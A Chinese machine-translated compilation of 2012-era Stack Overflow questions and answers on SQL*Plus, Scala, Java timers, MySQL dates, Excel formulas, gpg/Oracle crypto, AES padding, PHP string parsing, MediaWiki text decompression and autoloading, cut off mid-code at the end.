有一些[相关](https://stackoverflow.com/questions/643137/how-do-i-spool-to-a-csv-formatted-file-using-sqlplus)的问题，但具体不回答我的问题，具体是关于如何控制 SQLPLUS 查询的输出，以便它将所有结果集输出到文本文件，没有缓冲行，我的意思是保存在使用 SAVE 命令时的缓冲区。例如，它通常是第一行，带有“SQL>”提示符，然后是您的 SQL 语句。您如何完全删除该行并简单地输出（我假设使用 SPOOL）到文本文件？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T17:17:00.953

如果您以静默方式连接，则不会输出 SQL > 行`sqlplus -S schema/pw@db`

# scala - 地图中找不到钥匙

> ID：13572224
> 
> 赞同：1
> 
> 时间：2012-11-26T20:02:54.070
> 
> 标签：scala, map

鉴于这个非常简单的变量 - 子句模型

```
class Variable(name: String, negated: Boolean = false) {
    def evaluate(b: Boolean): Boolean = negated match {
        case false => b
        case true => !b
    }

    def negate = new Variable(this.name, !this.negated)

    override def toString = negated match {
        case false => name
        case true => "~" + name
    }

    override def hashCode() = name.hashCode()

    override def equals(obj: Any) = name.equals(obj)
}

class Clause(vars: List[Variable]) {
    def evaluate(values: Map[Variable, Boolean]): Boolean = {
        val evaluatedVars = vars.map(v => v.evaluate(values(v)))
        (false /: evaluatedVars)(_ || _)
    }
} 
```

这个简单的断言抛出异常

```
val c = new Variable("c")
val d = new Variable("d")
val c3 = new Clause(List(c.negate, d))
assertTrue( c2.evaluate( Map(c -> false, d -> true) ) ) 
```

> java.util.NoSuchElementException：找不到密钥：~c

我错过了什么？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T20:09:31.307

`Variable`不是一个`String`。你`equals`的坏了。

你要：

```
override def equals(a: Any) = a match {
  case v: Variable => v == name
  case s: String => name == s
  case _ => false
} 
```

（如果您不想`name`私下公开，但想`Variable`匹配随机字符串）。

# java - 如何将 actionlistener 应用于我的计时器？

> ID：13572226
> 
> 赞同：0
> 
> 时间：2012-11-26T20:02:56.667
> 
> 标签：java, timer, actionlistener

我正在尝试将 actionlistener 链接到我正在编写的游戏的计时器。每当计时器触发时，2D 阵列中的怪物会随机移动到相邻的一块。阵法中并没有完全布满怪物。在没有怪物的地方，我的数组为空。

这是我到目前为止所拥有的：

```
private class MonsterListener implements ActionListener {
    public void actionPerformed(ActionEvent e) {
        for (int i = 0; i < Level.SIZE; i++) {
            for (int j = 0; j < Level.SIZE; j++) {
                if (monsters[i][j] != null) {
                    monsters[i][j].update();
                }
            }
        }
        updateState();
    }
} 
```

在我的 Monster 类中：

```
public void update() {
        rand1 = new Random();
        rand2 = new Random();
        drow = rand1.nextInt(3); //random int 0,1,2
        dcol = rand2.nextInt(3); //random int 0,1,2
        drow -= 1; //random int -1,0,1
        dcol -= 1; //random int -1,0,1

        row += drow;
        col += dcol;
    } 
```

当我创建我的计时器时，我会这样做

```
public final int DELAY = 1000;
Timer myTimer = new Timer(DELAY, new MonsterListener()); 
```

但是，我不断收到错误消息

```
cannot find symbol
symbol  : constructor Timer(int,Game.MonsterListener)
location: class java.util.Timer
    myTimer = new Timer(DELAY, listener);
                      ^ 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:32:52.080

我认为你需要使用`javax.swing.Timer`而不是`java.util.Timer`

[我怀疑这是因为您正在使用`ActionListener`]

# php - 从 MySQL 查询中排除特定假期

> ID：13572229
> 
> 赞同：0
> 
> 时间：2012-11-26T20:02:59.903
> 
> 标签：php, mysql, datetime

我有这个查询，用于从我的数据库中提取记录：

```
SELECT dateAdded, claimedDate, TIMESTAMPDIFF(SECOND, dateAdded, claimedDate) AS output FROM leads 
WHERE HOUR(dateAdded) >= '9' 
AND HOUR(dateAdded) < '18' 
AND DAYOFWEEK(dateAdded) != 7 
AND DAYOFWEEK(dateAdded) != 1 
```

就目前而言，我目前只选择时间戳在周一至周五上午 9:00 至下午 5:00 之间的记录。我还需要能够排除以下主要节日：元旦、阵亡将士纪念日、独立日、劳动节、感恩节和圣诞节。

我需要永远排除那些假期。例如，查询应排除 11 月第四个星期四（感恩节）发生的所有记录，无论年份如何。

这不一定需要仅 MySQL 的解决方案。如果做一个混合 PHP/MySQL 解决方案更容易，那也很好用。谢谢您的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:04:55.277

您需要一个符合您的“假期”标准的日期表，然后您`JOIN`可以找到该表。

## [这是一个例子](http://sqlfiddle.com/#!2/ef5f4/2)

否则，您需要简单地排除它们......

```
... WHERE dateAdded NOT IN ('2012-07-04', ...) 
```

**更新**

[此解决方案](http://sqlfiddle.com/#!2/29221/1)使用 a`JOIN`来省略节假日。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-06-10T15:59:04.560

您可以创建一个函数 is_holiday，然后添加到您的 select 语句中。如此。

```
CREATE DEFINER=`root`@`localhost` FUNCTION `is_holiday`(nDate Date) RETURNS tinyint(1)
BEGIN
declare isholiday boolean;
set isholiday = false;

if month(nDate)=1 and day(nDate)=1 then set isholiday = true;
elseif month(nDate)=7 and day(nDate)=4 then set isholiday = true;
elseif month(nDate)=12 and day(nDate)=25 then set isholiday = true;
elseif month(nDate)=9 and day(nDate) between 1 and 7 and weekday(nDate) = 0 then set isholiday = true;
elseif month(nDate)=11 and day(nDate) between 22 and 28 and weekday(nDate) = 3 then set isholiday = true;
end if;

RETURN isholiday;
end 
```

添加到您的代码...

```
and not is_holiday(dateAdded) 
```

# excel - Excel：使用逻辑测试的返回值作为IF函数的返回值

> ID：13572230
> 
> 赞同：1
> 
> 时间：2012-11-26T20:03:01.210
> 
> 标签：excel, if-statement, return-value

这是从不涉及 VBA 的 excel 工作表中获取的。有什么方法可以重构

```
=IF(ISERROR(function_return),something_else,function_return) 
```

这样该术语`function_return`将只明确说明一次。因为`function_return`可能有很多参数我只想在一个地方调整，而不是在两个实例中调整。在其他语言中，我会尝试使用

```
var foo = function_return(many_many_arguments)
=IF(ISERROR(foo),something_else,foo) 
```

这样的事情可以在**一个细胞**内实现吗？

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:33:31.773

如果您使用的是 Excel 2007 及更高版本，则有一个功能可以完全执行此操作 - 查看`iferror()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:08:50.297

不确定我的解释是否正确（如果是这样，请忽略:)），但听起来您可以使用命名范围来模拟它。例如，如果我有函数`=SUM(A1:A5)`，我可以创建一个`Foo`等于的命名范围`=SUM(A1:A5)`。然后，我可以写一个像这样的公式：

```
=IF(ISERROR(Foo),"Something else",Foo) 
```

如果`Foo`计算正确，它将返回该值；否则，它将返回“其他东西”。您可以扩展`Foo`以涵盖您尝试计算的任何公式。然后，您可以`Foo`在任何公式中使用，而无需重新输入范围。

![在此处输入图像描述](../Images/6a8ccf9784d2df383ca9167f7156c64b.png)

# oracle - Oracle PL/SQL dbms_crypto 包可以解密使用 Linux gpg 命令加密的文件吗？

> ID：13572231
> 
> 赞同：2
> 
> 时间：2012-11-26T20:03:04.173
> 
> 标签：oracle, plsql, gnupg, dbms-crypto

我是加密新手，我想弄清楚 Linux gpg 命令和 Oracle 的 dbms_crypto 包是否可以一起工作。Oracle 版本是 11R2。我将收到由不同系统加密的文件，如果可能，我想通过 PL/SQL 解密它们。我正在作为 POC 运行下面的线程，看看这是否可能。

在 Linux 提示符下，我使用以下命令创建了一个密钥：

```
gpg --gen-key 
```

使用此命令创建了一个公钥（使用实际的电子邮件地址）：

```
gpg --armor --export xxx@yyy.com > mypublickey 
```

并像这样加密我的文件：

```
gpg -r xxx@yyy.com --output input.txt.encrypted --encrypt input.txt 
```

标准输出中有这条消息：

```
gpg: encrypted with 2048-bit RSA key 
```

所以现在我有一个加密文件。

我使用 blobs/clobs 将我的加密文件和我的 pub 密钥加载到一个 Oracle 表中。我正在尝试使用 dbms_crypto.decrypt 函数来解密文件：

```
select dbms_crypto.decrypt(
          encrypted_file,
          ?,
          utl_raw.cast_to_raw('public_key'),
          null)
from crypto_test_lobs 
```

在这一点上，我不确定要为第二个参数传递什么值，即“要使用的流或块密码类型和修饰符”。我尝试了几种不同的组合，导致各种可能不值得发布的异常。

所以我的问题是：

1.  这可能吗？
2.  我如何弄清楚第二个论点？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-11-01T13:22:42.640

gpg 使用[OpenPGP](https://www.rfc-editor.org/rfc/rfc4880)协议进行加密，您需要一个支持 OpenPGP 的 PL/SQL 包。

一个商业 PL/SQL 包[OraPGP](http://www.didisoft.com/ora-pgp/)支持 OpenPGP，下面是一个用它解密的例子：

```
DECLARE
  MESSAGE VARCHAR2(2000);
  PRIVATE_KEY VARCHAR2(200);
  KEY_PASSWORD VARCHAR2(200);
  v_Return VARCHAR2(200);
BEGIN
  MESSAGE := NULL;
  PRIVATE_KEY := 'c:\PGPKeys\private_key.asc';
  KEY_PASSWORD := 'key password';

  SELECT encrypted_data_field INTO MESSAGE
  FROM my_data_table
  WHERE my_id = 1000;

  v_Return := ORA_PGP.DECRYPT(
    MESSAGE => MESSAGE,
    PRIVATE_KEY => PRIVATE_KEY,
    KEY_PASSWORD => KEY_PASSWORD
  );

 DBMS_OUTPUT.PUT_LINE('Decrypted data = ' || v_Return);
END; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:25:33.453

Short answer to your first question: no, the large answer, the Oracle function seems to use only symmetric cyphers, while the key you created (RSA) is for use with asymmetric cyphers, this won't work. My recommendation is to take a look at the DES and AES algorithms and how they work so you better understand why.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:18:23.890

**`How do I figure out that 2nd argument?`**

第二个参数是一个整数，它定义了要使用的算法。另请参阅[http://docs.oracle.com/cd/B28359_01/appdev.111/b28419/d_crypto.htm](http://docs.oracle.com/cd/B28359_01/appdev.111/b28419/d_crypto.htm)。在 PL/SQL 中，您可以使用 DBMS_CRYPTO 包中的常量来设置这些值，例如将 AES-256 与 CBC 和 PKCS5-padding 一起使用，使用类似

```
encryption_type PLS_INTEGER := DBMS_CRYPTO.ENCRYPT_AES256
                             + DBMS_CRYPTO.CHAIN_CBC
                             + DBMS_CRYPTO.PAD_PKCS5; 
```

在 PL/SQL 之外，您需要知道常量定义的实际数字。有关相应列表，请参见[http://www.remote-dba.net/t_advanced_dbms_crypto.htm](http://www.remote-dba.net/t_advanced_dbms_crypto.htm)。要定义与上述相同的算法，您将使用 8 + 256 + 4096。

# wpf - 在依赖属性 (XAML) 中使用大值

> ID：13572233
> 
> 赞同：5
> 
> 时间：2012-11-26T20:03:10.250
> 
> 标签：wpf, xaml

我有一个带有暴露的双重依赖属性的用户控件。如果我尝试为其分配一个较大的值：

```
<UserControl Value="98765432.10"/> 
```

它构建并运行，但我在 setter 中得到数字“98765432.0”。较小的值可以正常工作。如果我使用代码隐藏将相同的大数字传递给控件，​​它也可以正常工作。

XAML 不能正确解析双精度数吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:09:01.220

尝试将双精度值声明为 WindowResource。您需要导入“mscorlib”命名空间。

```
<Window x:Class="WpfApplication5.Window1"
 xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" 
 xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"  
 xmlns:core="clr-namespaceystem;assembly=mscorlib"  
 Title="Window1" Height="700" Width="900">

  <Window.Resources>  
    <core:Double x:Key="myDouble">98765432.10</core:Double> 
  </Window.Resources>

  <UserControl Value="{StaticResource myDouble}"/>  
</Window> 
```

# makefile - 如何使用 lib 文件在 Makefile 中创建另一个 lib

> ID：13572234
> 
> 赞同：1
> 
> 时间：2012-11-26T20:03:19.093
> 
> 标签：makefile, gnu-make

我想制作一个使用另一个我的 lib 文件的 lib 文件。我在makefile中尝试了各种组合来进行链接，但有时它会要求链接命令被忽略或不发出警告，但当我尝试使用库中的代码时会崩溃。我的生成文件如下所示：

```
SRC = a.cpp b.cpp c.cpp etc.
OBJ = $(SRC:.cpp=.o)
OUT = ./libHTTPServer.a
INCLUDES := -I/home/myuser/Development/boost_1_51_0 \
            -I/home/myuser/Development/HTTPServers/Prot
CCFLAGS = -g
CCC = g++
LIBS = -L/home/myuser/Development/boost_1_51_0/buildedlibs/lib -lm
LDFLAGS = -g
.SUFFIXES: .cpp
.cpp.o:
    $(CCC) $(INCLUDES) $(CCFLAGS) -c $< -o $@ -lc libProt.a
$(OUT): $(OBJ)
    ar rcs $(OUT) $(OBJ)

depend: dep
dep:
    makedepend -- $(CCFLAGS) -- $(INCLUDES) $(SRC)
clean:
    rm -f $(OBJ) $(OUT) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:38:43.293

您无法将库链接到您正在创建的静态库。静态库只是打包到存档中的目标文件的集合。

如果 libProt 是您自己生成的并拥有目标文件，则可以将它们添加到您的`ar`命令中以“组合”这两个静态库。

# unix - 可以使用一个命令的输出作为别名的参数吗？

> ID：13572246
> 
> 赞同：0
> 
> 时间：2012-11-26T20:04:08.390
> 
> 标签：unix, command-line

我有 zshell，还有[sublime text 2的别名](http://www.sublimetext.com/)

我经常看捆绑 gem 的来源，所以我会运行这个

```
bundle show gemname 
```

-> 输出我必须复制的路径

```
subl path/to/gem 
```

我想将第一个命令的输出作为参数传递给别名。

使用别名是否可能是这样的：

```
bundle show gemname | subl 
```

或者它的一些变化？

我对全套 unix 命令行功能不是很熟悉。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:10:01.223

我相信这应该完全符合您的要求：

```
subl `bundle show gemname` 
```

注意反引号字符，它通常是 1 键左侧的键，也是典型键盘上 esc 键的下方。这表示在反引号中运行命令并在外部命令中使用它的输出。

# xpages - Xpages 文件上传控件什么都不做

> ID：13572249
> 
> 赞同：0
> 
> 时间：2012-11-26T20:04:23.540
> 
> 标签：xpages

背景：一个 xpage 绑定到 document1。在此 xpages 上是一个选项卡式表，其中包含多个选项卡。每个选项卡都包含一个绑定到其他数据源（包括 document2）的面板。Document2 被创建并成为 document1 的子项。每个面板中都有一个允许用户创建新文档的表格，以及两个视图控件。一切都很顺利......直到......

问题：我被要求添加一种将附件上传到子文档的方法。我首先在绑定的文档上创建了一个名为“ScannedInvoice”的富文本字段。然后我从核心控件创建一个文件上传控件并将其绑定到 document2/ScannedInvoice。按照规则，我只想要一个附件，否则我会考虑使用 openNTF 上传控件。

当我上传文件并创建新文档时，我无法弄清楚为什么后端什么都没有出现。其他一切正常，但 ScannedInvoice 字段中没有附件，文档也没有附加 $FILE 字段。

提前感谢您的任何提示。我已经搜索了很多，但没有找到任何答案。- 史蒂夫

```
<xp:fileUpload id="fileUpload1"
    value="#{document2.ScannedInvoice}" useUploadname="false"
    style="font-size:8pt" filename="scannedinvoice.jpg" 
    mimetype="image/jpeg">
</xp:fileUpload> 
```

注意：发票表单上的 ScannedInvoice 字段是富文本格式。

保存按钮的代码：document2.save() Document2 的 scope=request 和 ignoreRequestParam=true。这两个都必须像这样设置才能工作。parentID=# document1.getNoteID()

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-27T07:57:56.490

文件上传需要完全刷新页面才能上传文件。确保你正在这样做。

=======================================

更新 Domino 9.0.1 支持部分刷新上传

# java - AES 应该使用什么样的填充？

> ID：13572253
> 
> 赞同：6
> 
> 时间：2012-11-26T20:04:33.060
> 
> 标签：java, cryptography, aes, block, padding

我已经实现了 AES 加密（作业），但我偶然发现了填充消息的问题。

如果我的消息是这样的字节数组：

```
public byte[] encrypt(byte[] message) {
    int size = (int) Math.ceil(message.length / 16.0);
    byte[] result = new byte[size * 16];
    for (int i = 0; i < size; i++) {
        if ((i+1) * 16 > message.length){
            //padding here????
        } else {
            byte[] block = Arrays.copyOfRange(message, i * 16, (i + 1) * 16);
            byte[] encryptedBlock = encryptBlock(block);                
            System.arraycopy(encryptedBlock, 0, result, i*16, 16);
        }
    }
    return result;
} 
```

我怎样才能填充这样的消息？

我不能使用零填充，因为每个字节都可能为零，并且它可能会影响带有尾随零的此类消息。

我找不到任何关于如何做到这一点的参考资料[（](http://csrc.nist.gov/publications/fips/fips197/fips-197.pdf)描述 AES 加密的论文）

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-26T20:38:10.420

您可以使用多种方法，从简单到高级。Bruce Schneier 提出了两种相当简单的方法：

一种是用 n 个字节填充最后一个块，所有的值都为 n，这是 Alex Wien 建议的。这有问题（包括限制您使用长度小于 256 字节的块大小）。这种填充模式称为 PKCS#7 填充（用于 16 字节块）或 PKCS#5 填充（用于 8 字节块）。

另一种方法是附加一个值为 0x80 的字节（二进制值为 1000 0000 的字节），后跟所需数量的零字节以填充最后一个块。这种方法称为ISO padding，是ISO/IEC 9797-1 padding method 2的简称。padding本身就是bit-level padding，加一个值为1的bit，然后加0值的bit，直到到达block尺寸。

至于如何知道消息是否被填充，答案是消息*总是*会被填充：即使消息的最后一个块完全适合一个块（即消息的大小是块大小的倍数），你将不得不添加一个虚拟的最后一个块。

如果您有兴趣研究一些更高级的方法，请在维基百科上查找一种称为密文窃取的技术：[http ://en.wikipedia.org/wiki/Ciphertext_stealing](http://en.wikipedia.org/wiki/Ciphertext_stealing)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:06:23.683

填充有一个技巧：

您应该使用填充长度的字节表示来填充：

333

或者

4444

或 999999999

然后当您稍后读取第一个填充字节时，您知道还有多少字节要读取。

# javascript - Three.js - 设置相机以显示整个场景的算法？

> ID：13572258
> 
> 赞同：1
> 
> 时间：2012-11-26T20:04:45.320
> 
> 标签：javascript, 3d, three.js

当我设置场景、添加几何图形等时，如何设置相机以便看到整个场景？我正在尝试使用边界框实现算法，但我有点卡住了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T23:17:14.807

您实际上只需要使用 找到所有变量之间的最大绝对值`Math.abs(number)`，一旦找到最大值，您就可以将相机的 depth(position.z) 设置为该数字。我做了一个简单的函数，它接收 2 个数字并返回最大的。

```
function findGreatestAbsolute( firstNumber, secondNumber ) {
    if( Math.abs( firstNumber ) > Math.abs( secondNumber )) {
        return Math.abs( firstNumber );
    } else { return Math.abs( secondNumber ); }
} 
```

如果数字太多，您也可以使用数组。找到号码后，您可以：

```
 camera = new THREE.PerspectiveCamera( cameraFov, windowHalfX / windowHalfY , 1, someDepth );
    camera.position.z(greatestNumber); 
```

或者

```
 camera.position.set(yourX, yourY, greatestNumber); 
```

好吧，我希望它有所帮助。

# php - 分隔文件名解析为表行数据

> ID：13572260
> 
> 赞同：1
> 
> 时间：2012-11-26T20:04:51.780
> 
> 标签：php, filenames, delimited

我正在尝试将可变宽度、竖线 (|) 分隔的文件名转换为表数据。

例如

```
var1|var2|var3|var4|var5.pdf 
```

变成

```
<table border="2" bordercolor="#ffffff" width="100%" cellpadding="10" cellspacing="10">
    <tr>
        <td>$var1</td>
        <td>$var2</td>
        <td>$var3</td>
        <td>$var4</td>
        <td>$var5</td>
    </tr>
</table> 
```

我已经完成了一切，`var1`但无法弄清楚如何解析剩余的变量。这是我扔毛巾并决定在这里发帖的地方：

```
$var1 = substr($file_name, 0, strpos($file_name, '|')); 
```

想法？

先感谢您！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:20:42.173

我建议您将文件名分解为一个数组，而不是为每个文件创建变量，但我已经给出了如何实现这一点的示例代码。我希望我正确地回答了你的问题。

```
<?php
    $string = 'var1|var2|var3|var4|var5.pdf';
    // Trim the string of dangling pipes to make sure we don't get empty array elements.
    $string = trim($string, '|');
    // Split the filenames into an array. Much more managable that way.
    $filenames = explode('|', $string);
    // Define an empty array to put our variables in.
    $variables = array();
    // Because the array we made is not associative we can iterate through with a for loop.
    for($i = 0; $i < count($filenames); $i++) {
        // Make our variable names start from one; much more human-friendly. Add them to an array to extract later.
        $var_name = 'var' . ($i + 1);
        $variables[$var_name] = $filenames[$i];
    }
    // Extract the values of the array and place them into variables named after the array keys.
    extract($variables, EXTR_OVERWRITE); 
```

这将创建以下变量（连同它们的值）。

```
$var1 = 'var1';
$var2 = 'var2';
$var3 = 'var3';
$var4 = 'var4';
$var5 = 'var5.pdf'; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:12:42.087

如果您希望每个值在其单独的变量中，您可以结合使用`list()`，如下所示：`explode()`

```
list($var1,$var2,$var3,$var4,$var5) = explode('|', $filename); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:09:04.733

也许您可以使用 将所有字段放在一个数组中[`explode()`](http://ca1.php.net/manual/en/function.explode.php)，如下所示：

**PHP**

```
<?php
$data = "var1|var2|var3|var4|var5.pdf";
$fields = explode("|", $data);
var_dump($fields);
?> 
```

**输出**

```
array(5) { [0]=> string(4) "var1" [1]=> string(4) "var2" [2]=> string(4) "var3" [3]=> string(4) "var4" [4]=> string(8) "var5.pdf" } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-26T20:07:51.330

您正在寻找[`explode()`](http://ca1.php.net/manual/en/function.explode.php)功能。

```
$parts_arr = explode('|', $filename);
var_dump($parts_arr); 
```

此外，管道是我能想到的几乎所有 shell 中的特殊字符，我强烈建议*不要*在文件名中使用它们。

# python - 如何使用 python 操作表格数据？

> ID：13572265
> 
> 赞同：1
> 
> 时间：2012-11-26T20:04:58.920
> 
> 标签：python

我在 CSV 文件中有基于列的数据，我想以多种方式对其进行操作。人们将我指向 R，因为它使您可以轻松访问行和列，但我已经熟悉 python 并且更愿意使用它。

例如，我希望能够删除其中一列中具有特定值的所有行。或者我想更改一列的所有值（即修剪字符串）。我还希望能够基于常见值（如 SQL GROUP BY）聚合行。

有没有办法在 python 中做到这一点，而不必每次都编写一个循环来遍历所有行？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:06:37.617

看看[熊猫](http://pandas.pydata.org/)库。它提供了一个类似于 R 的数据帧的数据帧类型，可以让你做你正在谈论的事情。

# php - 使用 PHP 从 MediaWiki 数据库中提取压缩文本

> ID：13572268
> 
> 赞同：4
> 
> 时间：2012-11-26T20:05:10.500
> 
> 标签：php, mysql, zip, blob, mediawiki

我们的一个客户希望获得他们运行了一段时间的 wiki 站点的所有内容。他们为我们提供了“mediawiki”软件的完整数据库。我们正在尝试使用 php 从“文本”表中提取文章，而不使用 MediaWiki 引擎。

MediaWiki 似乎在将内容作为 BLOB 放入数据库之前对其进行压缩。如果没有引擎，我们无法找到提取它的方法。我查看了源代码，但无法重新创建它们如何提取 BLOB。

任何建议如何解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:15:11.643

从[文本表](http://www.mediawiki.org/wiki/Manual%3aText_table)：

> ### old_flags 
> 
> 逗号分隔的标志列表。包含以下可能的值：
> 
> ```
> ┌──────────┬────────────────────────────────────── ────────────────────────────┐
> │ gzip │ 文本用 PHP 的 gzdeflate() 函数压缩。│
> │ │注意：如果 $wgCompressRevisions 选项打开，新行 │
> │ │（=当前版本）将在保存时透明地压缩。│
> │ │ 以前的版本也可以使用脚本压缩 │
> │ │ compressOld.php │
> ├──────────┼────────────────────────────────────── ────────────────────────────┤
> │ utf-8 │ 文本存储为 UTF-8。│
> │ │注意：如果 $wgLegacyEncoding 选项打开，行 *without* this │
> │ │ flag 将在加载时透明地转换为 UTF-8。│
> ├──────────┼────────────────────────────────────── ────────────────────────────┤
> │ 对象 │ 文本字段包含一个序列化的 PHP 对象。│
> │ │注意：该对象要么包含多个压缩版本 │
> │ │ 一起达到更好的压缩比，还是指 │
> │ │ 可以找到文本的另一行。│
> ├──────────┼────────────────────────────────────── ────────────────────────────┤
> │ external │ 文本存储在 old_text 指定的外部位置 │
> └──────────┴────────────────────────────────────── ────────────────────────────┘
> 
> ```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2021-01-06T19:26:11.643

[https://www.mediawiki.org/wiki/Compression](https://www.mediawiki.org/wiki/Compression)

> 标有 old_flags="gzip" 的旧条目的 old_text 使用 zlib 的 deflate 算法压缩，没有标题字节。PHP 的 gzinflate() 将直接接受此文本；在 Perl 等中，将窗口大小设置为 -MAX_WSIZE 以禁用标题字节。

`gzinflate()`根据文档，应该像将 blob 数据输入 php 一样简单。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-11-26T20:09:42.750

只是一个猜测，但试试这样：

```
SELECT UNCOMPRESS(blobname) 
```

顺便说一句，我没有使用 MediaWiki 的经验，但我希望能让你朝着正确的方向前进

查看[此页面](http://dev.mysql.com/doc/refman/4.1/en/encryption-functions.html#function_uncompress)以获取有关 MySQL 压缩方法的更多信息。

# java - 如何避免执行循环外的代码

> ID：13572271
> 
> 赞同：0
> 
> 时间：2012-11-26T20:05:28.860
> 
> 标签：java, for-loop

我有一个方法，我在 for 循环中比较 arraylist 值。`Loop 2`如果 loop1 的任何单个条件为真，我不想执行（见下面的代码）。

现在发生了什么，对于某些值`loop 1`是 `loop 2`statisfy 而对于其他一些值是满意的。因此，我是 db 填充了错误的数据。

我想以这样的方式修改我的代码。如果任何数组列表值符合要求，`loop 1`则编译器应从`return ERROR`. 之后它不应该执行代码。

循环检查条件为`if(quant>Integer.parseInt(book.getQuantity()))`

动作.java。

```
 public String execute()
{   
      if(id.length == quantity.length)
    {
      for (int i = 0; i < id.length; ++i)
       { 
         book = dao.listbookdetailsByBId(id[i]);
         Double dq=new Double(quantity[i]);
         int quant=dq.intValue();  
          if(quant>Integer.parseInt(book.getQuantity()))
          {   
                 //Loop 1  , this is executing if any of the quant is greater then book.getQuantity()..                    
                //i want to stop executing LOOP2 ,if any of the value of quant is greater then book.getQuantity().
              addActionError("You have entered an invalid quantity for the Book Title- ''"+book.getBookTitile()+"''."); 
              return ERROR; 
          }   

    /*  Loop2 starts here
    *   Loop 2 , this is executing if any of the quant is lesser .. 
    *   The below code should execute only if compiler does not reach to the loop1 */

                      // Some DAO code goes here

       }
    }

    return SUCCESS;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:12:51.693

只需使用 break 语句

```
if(quant>Integer.parseInt(book.getQuantity()))
      {   
             //Loop 1  , this is executing if any of the quant is greater then book.getQuantity()..                    
            //i want to stop executing LOOP2 ,if any of the value of quant is greater then book.getQuantity().
          addActionError("You have entered an invalid quantity for the Book Title- ''"+book.getBookTitile()+"''."); 
          break; 
      } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:15:11.470

您应该使用 break 语句来实现这一点，或者您可以创建一个局部布尔变量并使用它来避免进入循环 2。

```
 if(quant>Integer.parseInt(book.getQuantity()))
          { flag=false;
}

if(flag){
//loop 2
} 
```

# localization - 如何在appbar按钮下翻译标志

> ID：13572273
> 
> 赞同：0
> 
> 时间：2012-11-26T20:05:41.697
> 
> 标签：localization, windows-runtime, winrt-xaml

您好，我想在标准 AddAppBarButton 下方本地化文本

```
<Style x:Key="AddAppBarButtonStyle" TargetType="ButtonBase" BasedOn="{StaticResource AppBarButtonStyle}">
    <Setter Property="AutomationProperties.AutomationId" Value="AddAppBarButton"/>
    <Setter Property="AutomationProperties.Name" Value="Add"/>
    <Setter Property="Content" Value="&#xE109;"/>
</Style> 
```

我试过在资源文件中添加类似

```
ButtonId.AutomationProperties.Name = value 
```

但它不起作用。应用程序启动时出现错误。我怎样才能翻译这个属性？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T05:54:22.050

Why not [put the translation strings in resource files](http://msdn.microsoft.com/en-us/library/windows/apps/xaml/hh965329.aspx) and let XAML parser do the work?

You need to create a folder in your project matching the locale name and put a resw file inside it, e.g `sl-SI\Resources.resw`.

Add `x:Uid` attribute to XAML elements to name them:

```
<Button x:Uid="AppBarButton" Style="{StaticResource AddAppBarButtonStyle}" /> 
```

Now just name the resource strings appropriately so that the XAML parser will find them. The pattern is `UidName.PropertyName`, e.g. `Button.Content`. In the case of AppBar buttons the syntax is a little more complex because of attached properties:

```
AppBarButton.[using:Windows.UI.Xaml.Automation]AutomationProperties.Name 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:40:47.010

你可以试试 AutomationProperties.SetName(ButtonId, value);

# php - PHP 自动加载（高效）

> ID：13572278
> 
> 赞同：1
> 
> 时间：2012-11-26T20:06:10.403
> 
> 标签：php, autoload

我在自动加载未正确命名的类时遇到问题。虽然我们的开发人员总是使用 Java 风格的文件名与类相同的方法，因此自动加载功能是微不足道的，但当[HybridAuth](http://hybridauth.sourceforge.net/)出现时，我们突然感到头疼。

为了记录，他们的命名系统是这样的：

*   **Hybrid_Auth**存在于*Hybrid/Auth.php*
*   **Hybrid_Provider_Adapter**存在于 *Hybrid/Provider_Adapter.php*
*   **Hybrid_Providers_Facebook**存在于*Hybrid/Providers/Facebook.php*
*   **OAuthRequest**（以及其他几个）存在于*Hybrid/thirdparts/OAuth/OAuth.php*

这就是它对我们可爱的小而和谐的自动加载器所做的：

### 原来的

```
function autoload($class)
{
    $search = array('classes',
                    'utils',
                    'config');

    foreach($search as $folder)
    {
            $file = ROOT_DIR.'/'.$folder.'/'.$class.'.php';

            if(file_exists($file)) 
            {
                    require_once $file;
            }
    }
} 
```

### 混合认证之后

```
function autoload($class)
{
    // FIXME: This is horrid.

    $search = array('classes',
                    'utils',
                    'config',
                    'utils/hybridauth/Hybrid',
                    'utils/hybridauth/Hybrid/Providers',
                    'utils/hybridauth/Hybrid/thirdparty/Facebook',
                    'utils/hybridauth/Hybrid/thirdparty/LinkedIn',
                    'utils/hybridauth/Hybrid/thirdparty/OAuth',
                    'utils/hybridauth/Hybrid/thirdparty/OpenID');

    // Stupid Hybrid Auth not using good file naming schemes
